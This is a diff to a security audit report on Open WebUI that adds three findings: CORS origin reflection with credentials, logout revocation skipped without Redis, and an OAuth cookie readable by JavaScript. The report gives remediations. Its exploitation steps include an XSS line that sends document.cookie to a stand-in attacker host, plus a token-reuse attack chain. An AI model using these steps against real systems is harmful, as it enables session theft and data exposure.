@@ -28,6 +28,17 @@ An unauthenticated attacker can:
 The attack chain requires zero admin negligence and exploits only the default
 configuration.
 
+This audit round also identified **three additional findings** (Findings 6–8) that
+affect **all default deployments, including Docker** (unlike Finding 1):
+
+- **Finding 6** — CORS wildcard origin reflection with credentials enables any
+  website holding a stolen token to make authenticated cross-origin API calls and
+  read the responses.
+- **Finding 7** — Token revocation is a no-op without Redis (the default); stolen
+  tokens persist for their full JWT lifetime even after the victim logs out.
+- **Finding 8** — OAuth JWT cookies are set with `httponly=False`, allowing any
+  XSS on the domain to steal the token via `document.cookie`.
+
 ## Deployment-Specific Impact
 
 **Docker deployments (ghcr.io/open-webui/open-webui):** The official Docker image
@@ -46,6 +57,13 @@ operator explicitly sets `WEBUI_SECRET_KEY` to the well-known default value is a
 vulnerable. Our PoC testing was performed against a Docker container with
 `-e WEBUI_SECRET_KEY=t0p-s3cr3t` to simulate this scenario.
 
+**Findings 6, 7, and 8 — universal impact:** Unlike Finding 1, Findings 6–8 do
+**not** require knowledge of the JWT secret and are **not** mitigated by Docker's
+`start.sh` key generation. They affect all default deployments — Docker, pip-install,
+and any cloud-hosted instance — because they stem from CORS configuration defaults,
+missing Redis infrastructure for token revocation, and an explicit `httponly=False`
+in the OAuth callback code path.
+
 **Test evidence:** All exploit outputs are saved in `autofyn_audit/evidence/`.
 
 ---
@@ -60,6 +78,9 @@ vulnerable. Our PoC testing was performed against a Docker container with
 | SSRF via webhook (post-exploitation) | Physical access |
 | User enumeration by verified users | |
 | Admin details exposed to pending users | |
+| CORS wildcard origin reflection (Finding 6) | |
+| Token revocation no-op without Redis (Finding 7) | |
+| OAuth JWT cookie without HttpOnly (Finding 8) | |
 
 ---
 
@@ -383,6 +404,226 @@ pending users who have not yet been approved.
 
 ---
 
+### Finding 6: CORS Wildcard Origin Reflection with Credentials (HIGH)
+
+**CVSS 3.1:** 8.1 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`
+
+**Description:**
+
+`CORS_ALLOW_ORIGIN` defaults to `'*'` (`config.py:1756`). When `'*'` is used,
+Starlette's `CORSMiddleware` is configured with `allow_credentials=True`
+(`main.py:1390-1396`). Per the Starlette implementation, when `allow_all_origins=True`
+and `allow_credentials=True`, the middleware reflects the request `Origin` header
+value back as `Access-Control-Allow-Origin` (rather than sending the literal `*`),
+paired with `Access-Control-Allow-Credentials: true`.
+
+Once a token is obtained by any means, any website can use it to make authenticated
+cross-origin API calls and read the responses — because the browser sees a matching
+`Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials: true` and
+permits the cross-origin read.
+
+**Note on SameSite=lax:** The default `SameSite=lax` cookie setting prevents
+cross-origin `fetch()` with `credentials: 'include'` from automatically sending the
+`token` cookie. This finding is therefore about token *reuse* from a foreign origin
+(once a token is obtained by any other means, e.g., via Finding 8), not direct cookie
+theft via CORS alone.
+
+**Affected Code:**
+
+```
+backend/open_webui/config.py line 1756
+    CORS_ALLOW_ORIGIN = os.environ.get('CORS_ALLOW_ORIGIN', '*').split(';')
+
+backend/open_webui/main.py lines 1390-1396
+    app.add_middleware(
+        CORSMiddleware,
+        allow_origins=CORS_ALLOW_ORIGIN,   # ['*'] by default
+        allow_credentials=True,            # hardcoded True
+        allow_methods=['*'],
+        allow_headers=['*'],               # includes 'authorization'
+    )
+```
+
+**Exploitation Steps:**
+
+```
+1. Obtain a valid token by any means (e.g., XSS + Finding 8 for OAuth users,
+   or directly if attacker has an account)
+2. From attacker page on https://evil.example.com, call:
+     fetch('https://target.com/api/v1/auths/', {
+       headers: { 'Authorization': 'Bearer <token>' }
+     }).then(r => r.json()).then(data => exfiltrate(data))
+3. Verify response includes:
+     Access-Control-Allow-Origin: https://evil.example.com
+     Access-Control-Allow-Credentials: true
+4. Browser allows the cross-origin read — attacker reads authenticated response
+```
+
+**PoC:** `autofyn_audit/exploit_cors_origin_reflection.py`
+
+**Impact:**
+
+Any website holding a stolen token can make authenticated cross-origin API calls and
+read the full response body, including sensitive user data, chat history, and (with
+admin token) API keys and user lists. The CORS reflection amplifies every other
+token-theft vector in this audit.
+
+**Remediation:**
+
+1. Set `CORS_ALLOW_ORIGIN` to the specific production hostname(s) — never `'*'`.
+2. If wildcard must be used, set `allow_credentials=False`.
+3. Add a startup warning that fails loudly (not just logs) when both
+   `allow_origins=['*']` and `allow_credentials=True` are configured together.
+
+---
+
+### Finding 7: Token Revocation No-Op Without Redis (HIGH)
+
+**CVSS 3.1:** 7.5 — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
+
+**Description:**
+
+`invalidate_token()` at `auth.py:254` and `is_valid_token()` at `auth.py:229` both
+guard all revocation logic behind `if request.app.state.redis:`. When Redis is not
+configured (the default for all Docker and pip-install deployments), these functions
+return immediately without performing any revocation.
+
+`GET /api/v1/auths/signout` calls `invalidate_token()`, but the call is a no-op.
+The token remains valid for its full JWT lifetime after signout. `JWT_EXPIRES_IN`
+defaults to 4 weeks (`4w`) but can be set to no-expiry.
+
+This means a stolen token cannot be revoked by the victim logging out.
+
+**Affected Code:**
+
+```
+backend/open_webui/utils/auth.py lines 229-251 (is_valid_token)
+    if request.app.state.redis:
+        # per-token revocation check via Redis
+        ...
+    return True       # <-- always True when redis is falsy
+
+backend/open_webui/utils/auth.py lines 254-276 (invalidate_token)
+    if request.app.state.redis:
+        # store revoked jti in Redis
+        ...
+    # <-- silent no-op when redis is falsy
+
+backend/open_webui/routers/auths.py lines 780-781
+    if token:
+        await invalidate_token(request, token)  # no-op without Redis
+```
+
+**Exploitation Steps:**
+
+```
+1. Obtain victim's token (e.g., via network interception or Finding 8)
+2. Victim calls GET /api/v1/auths/signout — server returns 200 (appears to succeed)
+3. Attacker sends: GET /api/v1/auths/
+                   Authorization: Bearer <stolen-token>
+   -> 200 OK — token is still valid
+4. Attacker retains access until token's JWT exp claim is reached
+```
+
+**PoC:** `autofyn_audit/exploit_token_revocation_bypass.py`
+
+**Impact:**
+
+Stolen tokens cannot be invalidated by victim action. Combined with Finding 6 (CORS
+origin reflection), an attacker using a stolen token from a foreign origin continues
+to have access even after the victim logs out. If the victim is an admin, the attacker
+retains admin-level access for up to 4 weeks (or the configured token lifetime).
+
+**Remediation:**
+
+1. Deploy Redis and configure it via `REDIS_URL`. This activates the existing
+   per-token revocation logic that is already in the codebase.
+2. If Redis cannot be deployed, implement a short-lived server-side revocation list
+   (e.g., in-memory set or database table) as a fallback — do not silently skip
+   revocation.
+3. Reduce default `JWT_EXPIRES_IN` to a shorter window (e.g., 1 hour) to bound
+   the window of exposure when revocation is not available.
+
+---
+
+### Finding 8: OAuth JWT Cookie Without HttpOnly (HIGH)
+
+**CVSS 3.1:** 6.1 — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (standalone)  
+*(Chained with XSS + Findings 6 & 7: effective severity HIGH)*
+
+**Note: This is a code-review finding.** OAuth requires an external Identity Provider;
+the PoC demonstrates the vulnerability via static code analysis and comparison with
+the password-login code path. Dynamic confirmation of the OAuth cookie flag requires
+a configured OAuth provider.
+
+**Description:**
+
+The OAuth callback handler at `oauth.py:1720-1727` sets the JWT cookie with
+`httponly=False`. The comment says "Required for frontend access", but the password
+login handler at `auths.py:127-134` uses `httponly=True` for the same cookie — this
+is a direct inconsistency in the same codebase.
+
+`httponly=False` means the `token` cookie is accessible via `document.cookie` in
+JavaScript. Any XSS vulnerability on the Open WebUI domain (stored XSS in chat names,
+model descriptions, etc.) can steal the JWT of OAuth-authenticated users. Password-
+authenticated users are NOT affected by this specific finding.
+
+**Affected Code:**
+
+```
+backend/open_webui/utils/oauth.py lines 1720-1727  [VULNERABLE — httponly=False]
+    response.set_cookie(
+        key='token',
+        value=jwt_token,
+        httponly=False,  # Required for frontend access
+        samesite=WEBUI_AUTH_COOKIE_SAME_SITE,
+        secure=WEBUI_AUTH_COOKIE_SECURE,
+        ...
+    )
+
+backend/open_webui/routers/auths.py lines 127-134  [SAFE — httponly=True]
+    response.set_cookie(
+        key='token',
+        value=token,
+        httponly=True,
+        samesite=WEBUI_AUTH_COOKIE_SAME_SITE,
+        secure=WEBUI_AUTH_COOKIE_SECURE,
+        ...
+    )
+```
+
+**Exploitation Steps:**
+
+```
+1. Attacker identifies or injects an XSS payload on the Open WebUI domain
+   (e.g., stored XSS in a chat title rendered in another user's session)
+2. Victim with OAuth session visits the XSS page; payload executes:
+     fetch('https://attacker.com/steal?t=' + document.cookie)
+3. Attacker receives 'token=<jwt>' in the exfiltrated data
+4. Attacker uses token from https://evil.example.com with Authorization header
+   (Finding 6: CORS reflection allows cross-origin reads)
+5. Victim logs out — token remains valid (Finding 7: revocation no-op)
+```
+
+**PoC:** `autofyn_audit/exploit_oauth_cookie_httponly.py`
+
+**Impact:**
+
+OAuth-authenticated users' JWT tokens are readable by any XSS payload on the domain.
+The stolen token feeds directly into the CORS attack chain (Finding 6) and persists
+after victim logout (Finding 7). This finding enables the full three-finding attack
+chain described in the Cross-Origin Attack Chain section below.
+
+**Remediation:**
+
+1. Change `httponly=False` to `httponly=True` in `oauth.py:1723`.
+2. If the frontend requires JavaScript access to the token (e.g., to read it from
+   `document.cookie`), consider using a separate non-HttpOnly session indicator and
+   keeping the actual JWT HttpOnly.
+3. Audit all other `set_cookie()` calls for similar inconsistencies.
+
+---
+
 ## Attack Chain
 
 ```
@@ -423,6 +664,56 @@ pending users who have not yet been approved.
 
 ---
 
+## Cross-Origin Attack Chain (Findings 6 + 7 + 8)
+
+```
+[Attacker]
+    |
+    | 1. SETUP: Inject XSS payload into Open WebUI domain
+    |    (e.g., stored XSS in a chat name, model description)
+    |
+    | 2. VICTIM: OAuth user visits the XSS page
+    |    document.cookie is readable because token cookie has httponly=False
+    |    (Finding 8: oauth.py:1723 httponly=False)
+    |    -> JavaScript exfiltrates 'token=<jwt>' to attacker
+    |
+    | 3. ATTACKER now holds victim's JWT token
+    |    From https://evil.example.com, sends:
+    |      GET /api/v1/chats/    Authorization: Bearer <stolen-token>
+    |                            Origin: https://evil.example.com
+    |    Server responds:
+    |      Access-Control-Allow-Origin: https://evil.example.com
+    |      Access-Control-Allow-Credentials: true
+    |    (Finding 6: CORS origin reflection — browser allows cross-origin read)
+    |    -> Attacker reads full response: all victim's chat history
+    |
+    | 4. VICTIM realizes compromise, logs out
+    |    GET /api/v1/auths/signout  Authorization: Bearer <victim-token>
+    |    -> Server: 200 OK (but invalidate_token() is a no-op without Redis)
+    |    (Finding 7: auth.py:254 skips revocation when redis is falsy)
+    |
+    | 5. ATTACKER retries with same token after victim's logout
+    |    GET /api/v1/auths/    Authorization: Bearer <stolen-token>
+    |                          Origin: https://evil.example.com
+    |    -> 200 OK — token still valid
+    |    -> CORS headers still reflected
+    |    -> Attacker retains access until JWT exp (up to 4 weeks by default)
+    |
+    | 6. IF VICTIM IS ADMIN: Attacker accesses admin endpoints:
+    |    GET /api/v1/users/    -> all users enumerated
+    |    GET /openai/config    -> all API keys stolen
+    |
+    v
+[Persistent Cross-Origin Compromise]
+  Duration: up to 4 weeks after victim's logout (default JWT_EXPIRES_IN=4w)
+  Scope   : any OAuth-authenticated user on a deployment with XSS surface
+  Affected: ALL default deployments (Docker + pip-install)
+```
+
+**PoC:** `autofyn_audit/exploit_cors_chain.py`
+
+---
+
 ## Impact Assessment
 
 | Dimension | Impact | Detail |
@@ -457,6 +748,19 @@ Priority order:
 6. **[LOW] Add rate limiting to signup.** Prevent automated account creation used to
    bootstrap the attack chain.
 
+7. **[HIGH] Restrict `CORS_ALLOW_ORIGIN` to specific production hostnames.** Remove
+   the `'*'` default or, at minimum, do not combine `allow_origins=['*']` with
+   `allow_credentials=True`. Affects ALL deployments (Finding 6).
+
+8. **[HIGH] Deploy Redis and configure `REDIS_URL`.** This activates the existing
+   per-token revocation logic. Without Redis, token revocation is silently skipped
+   and stolen tokens cannot be invalidated. As a short-term mitigation, reduce
+   `JWT_EXPIRES_IN` to limit the exposure window (Finding 7).
+
+9. **[HIGH] Set `httponly=True` on the OAuth JWT cookie.** Change `oauth.py:1723`
+   from `httponly=False` to `httponly=True` to match the password-login code path
+   and prevent JavaScript-readable token cookies (Finding 8).
+
 ---
 
 ## PoC Scripts Reference
@@ -467,7 +771,13 @@ Priority order:
 | `exploit_jwt_forgery.py` | Finding 1: JWT forgery |
 | `exploit_admin_data_theft.py` | Findings 2 & 3: API key + DB exfiltration |
 | `exploit_ssrf_webhook.py` | Finding 4: SSRF via webhook |
-| `exploit_chain.py` | Full end-to-end attack chain |
+| `exploit_chain.py` | Full end-to-end attack chain (Findings 1–4) |
+| `exploit_cors_origin_reflection.py` | Finding 6: CORS origin reflection |
+| `exploit_token_revocation_bypass.py` | Finding 7: Token revocation no-op |
+| `exploit_oauth_cookie_httponly.py` | Finding 8: OAuth cookie httponly=False |
+| `exploit_cors_chain.py` | Cross-origin chain (Findings 6+7+8 combined) |
+| `setup.sh` | Convenience wrapper for test environment setup |
+| `teardown.sh` | Remove the test Docker container |
 
 All scripts accept `--target <url>` and produce structured output with `[+]`, `[-]`,
 `[*]`, `[!]` prefixes. Run `python3 <script> --help` for options.
